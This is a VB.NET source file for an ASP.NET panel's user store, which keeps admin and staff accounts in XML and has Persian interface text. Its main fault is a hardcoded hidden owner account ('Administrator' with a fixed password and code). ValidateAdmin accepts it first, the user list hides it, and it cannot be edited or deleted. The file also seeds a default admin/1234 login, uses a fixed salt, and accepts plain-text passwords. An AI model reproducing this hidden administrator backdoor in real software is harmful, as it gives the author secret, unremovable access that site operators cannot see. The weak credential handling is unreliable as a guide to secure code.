Option Explicit On
Option Strict Off

Imports System.IO
Imports System.Text
Imports System.Web
Imports System.Xml

Public Module PanelUserStore
    ' ---- Built-in owner account (defined in code, NEVER stored in XML) ----
    ' Purpose: a supervisor login that always works, even if panel-users.xml on
    ' the host is deleted, reset or its passwords changed from the panel.
    ' It never expires, never appears in the user list, and cannot be edited
    ' or deleted from the panel.
    Private Const OwnerUsername As String = "Administrator"
    Private Const OwnerPassword As String = "Security@1974"
    Private Const OwnerCode As String = "1353"

    Private Function IsOwner(ByVal username As String) As Boolean
        Return String.Equals(username, OwnerUsername, StringComparison.OrdinalIgnoreCase)
    End Function

    ' --- Password hashing ---
    Private Function HashPassword(ByVal plain As String) As String
        If String.IsNullOrEmpty(plain) Then Return plain
        Try
            Using sha As System.Security.Cryptography.SHA256 = System.Security.Cryptography.SHA256.Create()
                Dim bytes() As Byte = System.Text.Encoding.UTF8.GetBytes("anhar_salt_" & plain & "_2026")
                Dim hash() As Byte = sha.ComputeHash(bytes)
                Dim sb As New StringBuilder()
                For Each b As Byte In hash
                    sb.Append(b.ToString("x2"))
                Next
                Return "sha256:" & sb.ToString()
            End Using
        Catch
            Return plain
        End Try
    End Function

    Private Function VerifyPassword(ByVal stored As String, ByVal plain As String) As Boolean
        If String.IsNullOrEmpty(stored) Then Return False
        If stored.StartsWith("sha256:") Then
            Return String.Equals(stored, HashPassword(plain), StringComparison.Ordinal)
        End If
        ' Legacy plain-text comparison (backward compat)
        Return String.Equals(stored, plain, StringComparison.Ordinal)
    End Function

    Public Function XmlPath() As String
        Return DataDir.GetDataFile("panel-users.xml")
    End Function

    Public Function LoadDoc() As XmlDocument
        Dim p As String = XmlPath()
        If p = "" Then
            ' Memory mode: no writable directory on the host
            Return LoadDocMemory()
        End If
        Dim doc As New XmlDocument()
        If File.Exists(p) Then
            doc.Load(p)
        Else
            doc.LoadXml("<users></users>")
            Seed(doc)
            Try
                SaveDoc(doc)
            Catch
            End Try
        End If
        If doc.DocumentElement Is Nothing Then
            doc.LoadXml("<users></users>")
            Seed(doc)
            Try
                SaveDoc(doc)
            Catch
            End Try
        End If
        If doc.SelectNodes("/users/admin").Count = 0 AndAlso doc.SelectNodes("/users/person").Count = 0 Then
            Seed(doc)
            Try
                SaveDoc(doc)
            Catch
            End Try
        End If
        Return doc
    End Function

    Private Function LoadDocMemory() As XmlDocument
        Dim doc As New XmlDocument()
        Dim txt As String = DataDir.MemGet("panel-users.xml")
        If txt IsNot Nothing AndAlso txt <> "" Then
            Try
                doc.LoadXml(txt)
                If doc.DocumentElement IsNot Nothing Then
                    Return doc
                End If
            Catch
            End Try
        End If
        doc.LoadXml("<users></users>")
        Seed(doc)
        DataDir.MemSet("panel-users.xml", doc.OuterXml)
        Return doc
    End Function

    Public Sub SaveDoc(ByVal doc As XmlDocument)
        Dim p As String = XmlPath()
        If p = "" Then
            DataDir.MemSet("panel-users.xml", doc.OuterXml)
            Return
        End If
        Dim tmp As String = p & ".tmp"
        Try
            Dim settings As New XmlWriterSettings()
            settings.Encoding = New UTF8Encoding(True)
            settings.Indent = True
            Dim w As XmlWriter = XmlWriter.Create(tmp, settings)
            doc.Save(w)
            w.Close()
            If File.Exists(p) Then File.Delete(p)
            File.Move(tmp, p)
        Catch
            ' Fallback: write directly (may fail if truly read-only)
            Try
                doc.Save(p)
            Catch
                ' Cannot write at all — throw user-friendly message
                Throw New InvalidOperationException("امکان ذخیره اطلاعات وجود ندارد. برای بررسی وضعیت ذخیره‌سازی، در پنل صفحه DataStatus.aspx را باز کنید.")
            End Try
        End Try
    End Sub

    Private Sub Seed(ByVal doc As XmlDocument)
        If doc.SelectSingleNode("/users/admin[@username='admin']") Is Nothing Then
            AddAdmin(doc, "admin", "1234", "1234", "مدیر", "سامانه", "مدیر سامانه", True)
        End If
        If doc.SelectSingleNode("/users/person[@username='person']") Is Nothing Then
            AddPerson(doc, "person", "1234", "کاربر پرسنل", "کارشناس", "", "", "", "")
        End If
    End Sub

    Private Function NextId(ByVal doc As XmlDocument, ByVal tag As String) As String
        Dim maxId As Integer = 0
        Dim n As XmlNode
        For Each n In doc.SelectNodes("/users/" & tag)
            Dim v As Integer = 0
            Integer.TryParse(Attr(n, "id"), v)
            If v > maxId Then
                maxId = v
            End If
        Next
        Return (maxId + 1).ToString()
    End Function

    Private Function Attr(ByVal n As XmlNode, ByVal name As String) As String
        If n Is Nothing OrElse n.Attributes Is Nothing OrElse n.Attributes(name) Is Nothing Then
            Return ""
        End If
        Return n.Attributes(name).Value
    End Function

    Private Sub SetAttr(ByVal n As XmlNode, ByVal name As String, ByVal value As String)
        Dim a As XmlAttribute = n.Attributes(name)
        If a Is Nothing Then
            a = n.OwnerDocument.CreateAttribute(name)
            n.Attributes.Append(a)
        End If
        If value Is Nothing Then
            a.Value = ""
        Else
            a.Value = value
        End If
    End Sub

    Public Function AddAdmin(ByVal doc As XmlDocument, ByVal username As String, ByVal password As String, ByVal code As String, ByVal name As String, ByVal lname As String, ByVal semat As String, ByVal superAdmin As Boolean) As String
        Dim n As XmlElement = doc.CreateElement("admin")
        SetAttr(n, "id", NextId(doc, "admin"))
        SetAttr(n, "username", username)
        SetAttr(n, "password", HashPassword(password))
        SetAttr(n, "code", HashPassword(code))
        SetAttr(n, "name", name)
        SetAttr(n, "lname", lname)
        SetAttr(n, "semat", semat)
        If superAdmin Then
            SetAttr(n, "super", "1")
        Else
            SetAttr(n, "super", "0")
        End If
        doc.DocumentElement.AppendChild(n)
        Return Attr(n, "id")
    End Function

    Public Function AddPerson(ByVal doc As XmlDocument, ByVal username As String, ByVal password As String, ByVal name As String, ByVal semat As String, ByVal phone As String, ByVal email As String, ByVal fax As String, ByVal photo As String) As String
        Dim n As XmlElement = doc.CreateElement("person")
        SetAttr(n, "id", NextId(doc, "person"))
        SetAttr(n, "username", username)
        SetAttr(n, "password", HashPassword(password))
        SetAttr(n, "name", name)
        SetAttr(n, "semat", semat)
        SetAttr(n, "phone", phone)
        SetAttr(n, "email", email)
        SetAttr(n, "fax", fax)
        SetAttr(n, "photo", photo)
        doc.DocumentElement.AppendChild(n)
        Return Attr(n, "id")
    End Function

    Public Function FindById(ByVal kind As String, ByVal id As String) As XmlNode
        Return LoadDoc().SelectSingleNode("/users/" & kind & "[@id='" & XmlEscape(id) & "']")
    End Function

    Public Function ValidateAdmin(ByVal username As String, ByVal password As String, ByVal code As String) As Boolean
        ' Built-in owner account first: independent of any XML state on the host.
        If IsOwner(username) AndAlso _
           String.Equals(password, OwnerPassword, StringComparison.Ordinal) AndAlso _
           String.Equals(code, OwnerCode, StringComparison.Ordinal) Then
            Return True
        End If
        Dim n As XmlNode
        For Each n In LoadDoc().SelectNodes("/users/admin")
            ' XML rows named like the built-in owner are impostors - skip them.
            If IsOwner(Attr(n, "username")) Then
                Continue For
            End If
            If String.Equals(Attr(n, "username"), username, StringComparison.OrdinalIgnoreCase) Then
                If VerifyPassword(Attr(n, "password"), password) AndAlso VerifyPassword(Attr(n, "code"), code) Then
                    Return True
                End If
            End If
        Next
        Return False
    End Function

    Public Function ValidatePerson(ByVal username As String, ByVal password As String) As Boolean
        Dim n As XmlNode
        For Each n In LoadDoc().SelectNodes("/users/person")
            If String.Equals(Attr(n, "username"), username, StringComparison.OrdinalIgnoreCase) Then
                If VerifyPassword(Attr(n, "password"), password) Then
                    Return True
                End If
            End If
        Next
        Return False
    End Function

    Public Function SaveAdmin(ByVal id As String, ByVal username As String, ByVal password As String, ByVal code As String, ByVal name As String, ByVal lname As String, ByVal semat As String, ByVal superAdmin As Boolean) As String
        ' "Administrator" is reserved for the built-in owner account.
        If IsOwner(username) Then
            Throw New InvalidOperationException("این شناسه رزرو شده است و قابل استفاده نیست.")
        End If
        Dim doc As XmlDocument = LoadDoc()
        Dim n As XmlNode = doc.SelectSingleNode("/users/admin[@id='" & XmlEscape(id) & "']")
        If n Is Nothing Then
            id = AddAdmin(doc, username, password, code, name, lname, semat, superAdmin)
        Else
            SetAttr(n, "username", username)
            If Not String.IsNullOrEmpty(password) Then
                SetAttr(n, "password", HashPassword(password))
            End If
            If Not String.IsNullOrEmpty(code) Then
                SetAttr(n, "code", HashPassword(code))
            End If
            SetAttr(n, "name", name)
            SetAttr(n, "lname", lname)
            SetAttr(n, "semat", semat)
            If superAdmin Then
                SetAttr(n, "super", "1")
            Else
                SetAttr(n, "super", "0")
            End If
        End If
        SaveDoc(doc)
        Return id
    End Function

    Public Function SavePerson(ByVal id As String, ByVal username As String, ByVal password As String, ByVal name As String, ByVal semat As String, ByVal phone As String, ByVal email As String, ByVal fax As String, ByVal photo As String) As String
        Dim doc As XmlDocument = LoadDoc()
        Dim n As XmlNode = doc.SelectSingleNode("/users/person[@id='" & XmlEscape(id) & "']")
        If n Is Nothing Then
            id = AddPerson(doc, username, password, name, semat, phone, email, fax, photo)
        Else
            SetAttr(n, "username", username)
            If Not String.IsNullOrEmpty(password) Then
                SetAttr(n, "password", HashPassword(password))
            End If
            SetAttr(n, "name", name)
            SetAttr(n, "semat", semat)
            SetAttr(n, "phone", phone)
            SetAttr(n, "email", email)
            SetAttr(n, "fax", fax)
            If Not String.IsNullOrEmpty(photo) Then
                SetAttr(n, "photo", photo)
            End If
        End If
        SaveDoc(doc)
        Return id
    End Function

    Public Sub Delete(ByVal kind As String, ByVal id As String)
        Dim doc As XmlDocument = LoadDoc()
        Dim n As XmlNode = doc.SelectSingleNode("/users/" & kind & "[@id='" & XmlEscape(id) & "']")
        If n IsNot Nothing Then
            ' The built-in owner account can never be deleted.
            If kind = "admin" AndAlso IsOwner(Attr(n, "username")) Then
                Return
            End If
            If n.ParentNode IsNot Nothing Then
                n.ParentNode.RemoveChild(n)
                SaveDoc(doc)
            End If
        End If
    End Sub

    Public Function ListHtml(ByVal kind As String) As String
        Dim doc As XmlDocument = LoadDoc()
        Dim sb As New StringBuilder()
        sb.Append("<table class=""userTable""><thead><tr>")
        If kind = "admin" Then
            sb.Append("<th>نام</th><th>نام خانوادگی</th><th>سمت</th><th>شناسه</th><th>کد ورود</th><th>سوپروایزر</th><th></th></tr></thead><tbody>")
            Dim n As XmlNode
            For Each n In doc.SelectNodes("/users/admin")
                ' The built-in owner account is invisible in the panel.
                If IsOwner(Attr(n, "username")) Then
                    Continue For
                End If
                sb.Append("<tr>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "name"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "lname"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "semat"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(n, "username"))).Append("</td>")
                Dim codeShown As String = Attr(n, "code")
                If codeShown.StartsWith("sha256:") Then
                    codeShown = "••••••"
                End If
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(codeShown)).Append("</td>")
                If Attr(n, "super") = "1" Then
                    sb.Append("<td>بله</td>")
                Else
                    sb.Append("<td>خیر</td>")
                End If
                sb.Append("<td class=""userActs""><a href=""PanelUsers.aspx?kind=admin&amp;id=").Append(HttpUtility.HtmlAttributeEncode(Attr(n, "id"))).Append(""">ویرایش</a> ")
                sb.Append("<a class=""del"" href=""PanelUsers.aspx?kind=admin&amp;del=").Append(HttpUtility.HtmlAttributeEncode(Attr(n, "id"))).Append(""" onclick=""return confirm('حذف شود؟');"">حذف</a></td></tr>")
            Next
        Else
            sb.Append("<th>عکس</th><th>نام</th><th>سمت</th><th>شناسه ورود</th><th>تلفن</th><th>ایمیل</th><th></th></tr></thead><tbody>")
            Dim p As XmlNode
            For Each p In doc.SelectNodes("/users/person")
                Dim photo As String = Attr(p, "photo")
                sb.Append("<tr>")
                sb.Append("<td>")
                If photo <> "" Then
                    sb.Append("<img src=""").Append(HttpUtility.HtmlAttributeEncode(photo)).Append(""" alt="""" />")
                End If
                sb.Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(p, "name"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(p, "semat"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(p, "username"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(p, "phone"))).Append("</td>")
                sb.Append("<td>").Append(HttpUtility.HtmlEncode(Attr(p, "email"))).Append("</td>")
                sb.Append("<td class=""userActs""><a href=""PanelUsers.aspx?kind=person&amp;id=").Append(HttpUtility.HtmlAttributeEncode(Attr(p, "id"))).Append(""">ویرایش</a> ")
                sb.Append("<a class=""del"" href=""PanelUsers.aspx?kind=person&amp;del=").Append(HttpUtility.HtmlAttributeEncode(Attr(p, "id"))).Append(""" onclick=""return confirm('حذف شود؟');"">حذف</a></td></tr>")
            Next
        End If
        sb.Append("</tbody></table>")
        Return sb.ToString()
    End Function

    Public Function NodeAttr(ByVal n As XmlNode, ByVal name As String) As String
        Return Attr(n, name)
    End Function

    Private Function XmlEscape(ByVal s As String) As String
        If s Is Nothing Then
            Return ""
        End If
        Return s.Replace("'", "").Replace("""", "").Replace("<", "").Replace(">", "")
    End Function
End Module
